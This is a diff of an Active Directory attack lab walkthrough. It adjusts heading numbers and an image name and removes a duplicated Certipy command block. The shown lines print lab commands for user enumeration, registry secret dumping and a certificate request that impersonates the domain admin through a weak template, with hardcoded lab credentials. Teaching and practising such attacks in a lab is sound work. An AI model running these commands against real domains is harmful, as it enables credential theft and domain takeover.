@@ -444,7 +444,7 @@ ls
 
 <Details><summary>
 
-## &#x2465; Get AD Users 
+## &#x2461; Get AD Users 
 
 </summary><blockquote>
 
@@ -462,7 +462,7 @@ GetADUsers.py -all -ts doazlab.com/doadmin:'DOLabAdmin1!' -dc-ip 192.168.2.4 |te
 
 ```
 
-| ![Get AD Users](img/GetADUsers.png) |
+| ![Get AD Users](img/getadusers.jpg) |
 |------------------------------------------------|
 
 &#x21E8; *Step complete. Go to the next step!*
@@ -689,7 +689,7 @@ python3 regsecrets.py -k -no-pass -dc-ip 192.168.2.4 doazlab.com/doadmin@ws05.do
 
 <Details><summary>
 
-## &#x2468; Extras from here out. 
+## &#x2469; Extras from here out. 
 
 </summary><blockquote>
 
@@ -805,15 +805,6 @@ In the next step, we will attempt to exploit one of the weak certificate templat
 ```bash
 DOADMINSID=$(rpcclient -U noprivuser%'N0PrivU53R' 192.168.2.4 -c "lookupnames doadmin" | awk '{print $2}') 
 printf "\n $DOADMINSID \n\n"
-certipy req -target-ip 192.168.2.4 -u noprivuser@doazlab.com -p 'N0PrivU53R' -ca doazlab-DC01-CA -template DOAZLab_User -dc-ip 192.168.2.4 -upn doadmin@doazlab.com
-```
-
-| &#x1F427; Bash Input | Linux Host: Nux01 |
-|----------------------|-------------------|
-
-```
-cd /opt/Certipy
-source /root/pyenv/Certipy/bin/activate
 certipy req -target-ip 192.168.2.4 -u noprivuser@doazlab.com -p 'N0PrivU53R' -ca doazlab-DC01-CA -template DOAZLab_User -dc-ip 192.168.2.4 -upn doadmin@doazlab.com -sid $DOADMINSID
 ```
 
